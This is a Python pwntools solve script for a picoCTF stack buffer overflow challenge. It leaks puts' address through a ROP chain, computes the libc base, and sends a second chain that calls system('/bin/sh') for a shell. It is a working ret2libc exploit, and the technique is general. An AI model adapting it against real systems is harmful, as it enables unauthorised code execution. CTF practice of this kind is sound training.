#!/usr/bin/env python3

from pwn import *

context.binary = exe = ELF("./vuln_patched")
context.arch = "amd64"
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r,'''
            break *(main)
                        ''')
    else:
        r = remote("mercury.picoctf.net", 49464)

    return r


def main():
    r = conn()
    p = r
    binary = ELF('./vuln_patched')
    rop = ROP(binary)
    gadget = rop.find_gadget(['pop rdi', 'ret'])
    ret_gadget = rop.find_gadget(['ret'])[0]
    puts_got = exe.got['puts']
    print(gadget)
    
    rop.puts(puts_got) #leak puts addr
    rop.call(exe.symbols['main']) # go back to main

    #make payload with bof offset
    payload = flat({
        136: rop.chain()
    })

    p.recvline()
    p.sendline(payload)

    #retrive the leaked address of puts
    ret = p.recvuntil("R!")
    puts_addr = u64(ret[122:128].ljust(8, b"\x00"))

    #calculate puts addr
    libc_addr = puts_addr - libc.symbols['puts']
    binsh = next(libc.search(b'/bin/sh\x00'))

    print("puts_got="+hex(puts_got))
    print("bin_sh="+hex(next(libc.search(b'/bin/sh\x00'))))
    print("puts_addr="+hex(puts_addr))
    print("libc_addr="+hex(libc_addr))

    # we now know libc addr so we update it
    libc.address = libc_addr

    # build second rop chain to call system("/bin/sh")
    rop = ROP([binary, libc])

    rop.raw(ret_gadget) #stack alignment
    rop.system(libc_addr+binsh) # call system("/bin/sh")
    payload = flat({
        136: rop.chain()
    })

    p.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
